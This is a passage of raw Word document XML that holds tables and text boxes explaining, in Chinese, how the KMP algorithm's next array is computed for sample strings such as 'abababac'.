              <v:shape id="Shape 23" o:spid="_x0000_s1026" o:spt="202" type="#_x0000_t202" style="position:absolute;left:0pt;margin-left:111.4pt;margin-top:125.25pt;height:170.25pt;width:261pt;mso-position-horizontal-relative:page;mso-wrap-distance-bottom:25.75pt;mso-wrap-distance-top:125.25pt;z-index:125830144;mso-width-relative:page;mso-height-relative:page;" filled="f" stroked="f" coordsize="21600,21600" o:gfxdata="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07nzi2gAAAAsB&#10;AAAPAAAAAAAAAAEAIAAAACIAAABkcnMvZG93bnJldi54bWxQSwECFAAUAAAACACHTuJAtlPW4qcB&#10;AABnAwAADgAAAAAAAAABACAAAAApAQAAZHJzL2Uyb0RvYy54bWxQSwUGAAAAAAYABgBZAQAAQgUA&#10;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1065"/>
                        <w:gridCol w:w="4155"/>
                      </w:tblGrid>
                      <w:tr>
                        <w:tblPrEx>
                          <w:tblCellMar>
                            <w:top w:w="0" w:type="dxa"/>
                            <w:left w:w="10" w:type="dxa"/>
                            <w:bottom w:w="0" w:type="dxa"/>
                            <w:right w:w="10" w:type="dxa"/>
                          </w:tblCellMar>
                        </w:tblPrEx>
                        <w:trPr>
                          <w:trHeight w:val="255" w:hRule="exact"/>
                          <w:tblHeader/>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680"/>
                              <w:jc w:val="left"/>
                            </w:pPr>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>A</w:t>
                            </w:r>
                          </w:p>
                        </w:tc>
                        <w:tc>
                          <w:tcPr>
                            <w:tcBorders>
                              <w:top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BCDEFGHIJK</w:t>
                            </w:r>
                          </w:p>
                        </w:tc>
                      </w:tr>
                      <w:tr>
                        <w:tblPrEx>
                          <w:tblCellMar>
                            <w:top w:w="0" w:type="dxa"/>
                            <w:left w:w="10" w:type="dxa"/>
                            <w:bottom w:w="0" w:type="dxa"/>
                            <w:right w:w="10" w:type="dxa"/>
                          </w:tblCellMar>
                        </w:tblPrEx>
                        <w:trPr>
                          <w:trHeight w:val="210" w:hRule="exact"/>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lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                              </w:rPr>
                              <w:t xml:space="preserve">一 </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>index</w:t>
                            </w:r>
                          </w:p>
                        </w:tc>
                        <w:tc>
                          <w:tcPr>
                            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                            <w:vAlign w:val="bottom"/>
                          </w:tcPr>
                          <w:p>
                            <w:pPr>
                              <w:pStyle w:val="17"/>
                              <w:keepNext w:val="0"/>
                              <w:keepLines w:val="0"/>
                              <w:widowControl w:val="0"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                              <w:tabs>
                                <w:tab w:val="left" w:pos="705"/>
                                <w:tab w:val="left" w:pos="1125"/>
                                <w:tab w:val="left" w:pos="1515"/>
                                <w:tab w:val="left" w:pos="1920"/>
                                <w:tab w:val="left" w:pos="3045"/>
                              </w:tabs>
                              <w:bidi w:val="0"/>
                              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                              <w:ind w:left="0" w:right="0" w:firstLine="300"/>
                              <w:jc w:val="left"/>
                            </w:pP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4 5 6</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>7</w:t>
                            </w:r>
                          </w:p>
                        </w:tc>
                      </w:tr>
                      <w:tr>
                        <w:tblPrEx>
                          <w:tblCellMar>
                            <w:top w:w="0" w:type="dxa"/>
                            <w:left w:w="10" w:type="dxa"/>
                            <w:bottom w:w="0" w:type="dxa"/>
                            <w:right w:w="10" w:type="dxa"/>
                          </w:tblCellMar>
                        </w:tblPrEx>
                        <w:trPr>
                          <w:trHeight w:val="270" w:hRule="exact"/>
                        </w:trPr>
                        <w:tc>
                          <w:tcPr>
                            <w:tcBorders>
                              <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>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 str：</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b a b a b a c</w:t>
                            </w:r>
                          </w:p>
                        </w:tc>
                      </w:tr>
                      <w:tr>
                        <w:tblPrEx>
                          <w:tblCellMar>
                            <w:top w:w="0" w:type="dxa"/>
                            <w:left w:w="10" w:type="dxa"/>
                            <w:bottom w:w="0" w:type="dxa"/>
                            <w:right w:w="10" w:type="dxa"/>
                          </w:tblCellMar>
                        </w:tblPrEx>
                        <w:trPr>
                          <w:trHeight w:val="240"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 next</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                              </w:rPr>
                              <w:t>:</w:t>
                            </w:r>
                          </w:p>
                        </w:tc>
                        <w:tc>
                          <w:tcPr>
                            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                            <w:vAlign w:val="top"/>
                          </w:tcPr>
                          <w:p>
                            <w:pPr>
                              <w:pStyle w:val="17"/>
                              <w:keepNext w:val="0"/>
                              <w:keepLines w:val="0"/>
                              <w:widowControl w:val="0"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                              <w:tabs>
                                <w:tab w:val="left" w:pos="1110"/>
                              </w:tabs>
                              <w:bidi w:val="0"/>
                              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                              <w:ind w:left="0" w:right="0" w:firstLine="180"/>
                              <w:jc w:val="left"/>
                            </w:pPr>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>-1 -1</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>0</w:t>
                            </w:r>
                          </w:p>
                        </w:tc>
                      </w:tr>
                      <w:tr>
                        <w:tblPrEx>
                          <w:tblCellMar>
                            <w:top w:w="0" w:type="dxa"/>
                            <w:left w:w="10" w:type="dxa"/>
                            <w:bottom w:w="0" w:type="dxa"/>
                            <w:right w:w="10" w:type="dxa"/>
                          </w:tblCellMar>
                        </w:tblPrEx>
                        <w:trPr>
                          <w:trHeight w:val="225"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4</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480"/>
                              <w:jc w:val="left"/>
                            </w:pPr>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>str</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                              </w:rPr>
                              <w:t xml:space="preserve">: </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>a b a b a b a c</w:t>
                            </w:r>
                          </w:p>
                        </w:tc>
                      </w:tr>
                      <w:tr>
                        <w:tblPrEx>
                          <w:tblCellMar>
                            <w:top w:w="0" w:type="dxa"/>
                            <w:left w:w="10" w:type="dxa"/>
                            <w:bottom w:w="0" w:type="dxa"/>
                            <w:right w:w="10" w:type="dxa"/>
                          </w:tblCellMar>
                        </w:tblPrEx>
                        <w:trPr>
                          <w:trHeight w:val="240"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lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>5</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810" w:hRule="exact"/>
                        </w:trPr>
                        <w:tc>
                          <w:tcPr>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再比较下一位，相同就比前一个加一。</w:t>
                            </w:r>
                          </w:p>
                        </w:tc>
                      </w:tr>
                      <w:tr>
                        <w:tblPrEx>
                          <w:tblCellMar>
                            <w:top w:w="0" w:type="dxa"/>
                            <w:left w:w="10" w:type="dxa"/>
                            <w:bottom w:w="0" w:type="dxa"/>
                            <w:right w:w="10" w:type="dxa"/>
                          </w:tblCellMar>
                        </w:tblPrEx>
                        <w:trPr>
                          <w:trHeight w:val="210"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680"/>
                              <w:jc w:val="left"/>
                            </w:pPr>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>A</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B C D E F G E I J K</w:t>
                            </w:r>
                          </w:p>
                        </w:tc>
                      </w:tr>
                      <w:tr>
                        <w:tblPrEx>
                          <w:tblCellMar>
                            <w:top w:w="0" w:type="dxa"/>
                            <w:left w:w="10" w:type="dxa"/>
                            <w:bottom w:w="0" w:type="dxa"/>
                            <w:right w:w="10" w:type="dxa"/>
                          </w:tblCellMar>
                        </w:tblPrEx>
                        <w:trPr>
                          <w:trHeight w:val="225"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1 </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>index</w:t>
                            </w:r>
                          </w:p>
                        </w:tc>
                        <w:tc>
                          <w:tcPr>
                            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                            <w:vAlign w:val="top"/>
                          </w:tcPr>
                          <w:p>
                            <w:pPr>
                              <w:pStyle w:val="17"/>
                              <w:keepNext w:val="0"/>
                              <w:keepLines w:val="0"/>
                              <w:widowControl w:val="0"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                              <w:tabs>
                                <w:tab w:val="left" w:pos="705"/>
                                <w:tab w:val="left" w:pos="1515"/>
                                <w:tab w:val="left" w:pos="1920"/>
                                <w:tab w:val="left" w:pos="3045"/>
                              </w:tabs>
                              <w:bidi w:val="0"/>
                              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                              <w:ind w:left="0" w:right="0" w:firstLine="300"/>
                              <w:jc w:val="left"/>
                            </w:pP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4 5 6</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>7</w:t>
                            </w:r>
                          </w:p>
                        </w:tc>
                      </w:tr>
                      <w:tr>
                        <w:tblPrEx>
                          <w:tblCellMar>
                            <w:top w:w="0" w:type="dxa"/>
                            <w:left w:w="10" w:type="dxa"/>
                            <w:bottom w:w="0" w:type="dxa"/>
                            <w:right w:w="10" w:type="dxa"/>
                          </w:tblCellMar>
                        </w:tblPrEx>
                        <w:trPr>
                          <w:trHeight w:val="255" w:hRule="exact"/>
                        </w:trPr>
                        <w:tc>
                          <w:tcPr>
                            <w:tcBorders>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2 </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>str：</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abababac</w:t>
                            </w:r>
                          </w:p>
                        </w:tc>
                      </w:tr>
                      <w:tr>
                        <w:tblPrEx>
                          <w:tblCellMar>
                            <w:top w:w="0" w:type="dxa"/>
                            <w:left w:w="10" w:type="dxa"/>
                            <w:bottom w:w="0" w:type="dxa"/>
                            <w:right w:w="10" w:type="dxa"/>
                          </w:tblCellMar>
                        </w:tblPrEx>
                        <w:trPr>
                          <w:trHeight w:val="195" w:hRule="exact"/>
                        </w:trPr>
                        <w:tc>
                          <w:tcPr>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3 </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>next</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                              </w:rPr>
                              <w:t>:</w:t>
                            </w:r>
                          </w:p>
                        </w:tc>
                        <w:tc>
                          <w:tcPr>
                            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                            <w:vAlign w:val="bottom"/>
                          </w:tcPr>
                          <w:p>
                            <w:pPr>
                              <w:pStyle w:val="17"/>
                              <w:keepNext w:val="0"/>
                              <w:keepLines w:val="0"/>
                              <w:widowControl w:val="0"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                              <w:tabs>
                                <w:tab w:val="left" w:pos="1110"/>
                                <w:tab w:val="left" w:pos="1515"/>
                              </w:tabs>
                              <w:bidi w:val="0"/>
                              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                              <w:ind w:left="0" w:right="0" w:firstLine="180"/>
                              <w:jc w:val="left"/>
                            </w:pPr>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>-1 -1</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12 3 4</w:t>
                            </w:r>
                          </w:p>
                        </w:tc>
                      </w:tr>
                      <w:tr>
                        <w:tblPrEx>
                          <w:tblCellMar>
                            <w:top w:w="0" w:type="dxa"/>
                            <w:left w:w="10" w:type="dxa"/>
                            <w:bottom w:w="0" w:type="dxa"/>
                            <w:right w:w="10" w:type="dxa"/>
                          </w:tblCellMar>
                        </w:tblPrEx>
                        <w:trPr>
                          <w:trHeight w:val="270" w:hRule="exact"/>
                        </w:trPr>
                        <w:tc>
                          <w:tcPr>
                            <w:tcBorders>
                              <w:left w:val="single" w:color="auto" w:sz="4" w:space="0"/>
                            </w:tcBorders>
                            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                            <w:vAlign w:val="top"/>
                          </w:tcPr>
                          <w:p>
                            <w:pPr>
                              <w:widowControl w:val="0"/>
                              <w:rPr>
                                <w:sz w:val="10"/>
                                <w:szCs w:val="10"/>
                              </w:rPr>
                            </w:pP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480"/>
                              <w:jc w:val="left"/>
                            </w:pPr>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>str: a b a b a b a c</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1405255</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1371600</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="2876550" cy="171450"/>
                <wp:effectExtent l="0" t="0" r="0" b="0"/>
                <wp:wrapNone/>
                <wp:docPr id="25" name="Shape 25"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="2876550" cy="1714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w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                              </w:rPr>
                              <w:t>和</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>a</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                              </w:rPr>
                              <w:t>相同，</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>next</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                              </w:rPr>
                              <w:t>数组存前一个</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>k=~l</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                              </w:rPr>
                              <w:t>加1等干</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>0.</w:t>
                            </w:r>
                          </w:p>
                        </w:txbxContent>
                      </wps:txbx>
                      <wps:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
                        <a:noAutofit/>
                      </wps:bodyPr>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:shape id="Shape 25" o:spid="_x0000_s1026" o:spt="202" type="#_x0000_t202" style="position:absolute;left:0pt;margin-left:110.65pt;margin-top:108pt;height:13.5pt;width:226.5pt;mso-position-horizontal-relative:page;z-index:503316480;mso-width-relative:page;mso-height-relative:page;" filled="f" stroked="f" coordsize="21600,21600" o:gfxdata="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mAtRH2QAAAAsBAAAP&#10;AAAAAAAAAAEAIAAAACIAAABkcnMvZG93bnJldi54bWxQSwECFAAUAAAACACHTuJAeiiTdaUBAABm&#10;AwAADgAAAAAAAAABACAAAAAoAQAAZHJzL2Uyb0RvYy54bWxQSwUGAAAAAAYABgBZAQAAPw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w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                        </w:rPr>
                        <w:t>和</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                        </w:rPr>
                        <w:t>a</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                        </w:rPr>
                        <w:t>相同，</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                        </w:rPr>
                        <w:t>next</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                        </w:rPr>
                        <w:t>数组存前一个</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                        </w:rPr>
                        <w:t>k=~l</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                        </w:rPr>
                        <w:t>加1等干</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                        </w:rPr>
                        <w:t>0.</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="400"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>看这5个字符串相同的前后缀的长度，即</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>next [4]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中储存的值：2再加1,因为这5个 字符串就是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>str</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的前五个字符串！</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:pBdr>
          <w:bottom w:val="single" w:color="auto" w:sz="4" w:space="0"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1700" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>bIcId eIfI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>g h i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:smallCaps w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> j</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:smallCaps w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:vertAlign w:val="superscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="23"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="600"/>
          <w:tab w:val="left" w:pos="968"/>
          <w:tab w:val="left" w:pos="1800"/>
          <w:tab w:val="left" w:pos="2925"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="180"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="125830144" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="page">
                  <wp:posOffset>1529080</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>12700</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="533400" cy="466725"/>
